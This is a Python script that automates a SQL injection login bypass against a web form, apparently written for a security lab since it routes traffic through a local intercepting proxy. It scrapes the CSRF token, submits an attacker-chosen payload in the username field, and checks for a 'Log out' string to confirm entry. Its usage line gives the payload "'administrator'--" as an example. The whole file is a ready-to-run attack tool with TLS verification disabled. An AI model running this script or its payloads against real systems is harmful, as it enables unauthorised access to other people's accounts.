import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    print("[DEBUG] Response Text:\n", r.text[:500])  # Print first 500 characters for debugging
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {"name": "csrf"})  # Adjust based on actual HTML
    if not csrf_input:
        raise ValueError("CSRF token not found!")
    return csrf_input["value"]

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "randomtext"
    }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    print("[DEBUG] Post Response Text:\n", r.text[:500])  # Debugging
    return "Log out" in r.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s www.example.com \"'administrator'--\"" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    try:
        if exploit_sqli(s, url, sqli_payload):
            print("[+] SQL injection successful!")
        else:
            print("[-] SQL injection failed!")
    except Exception as e:
        print(f"[ERROR] {e}")
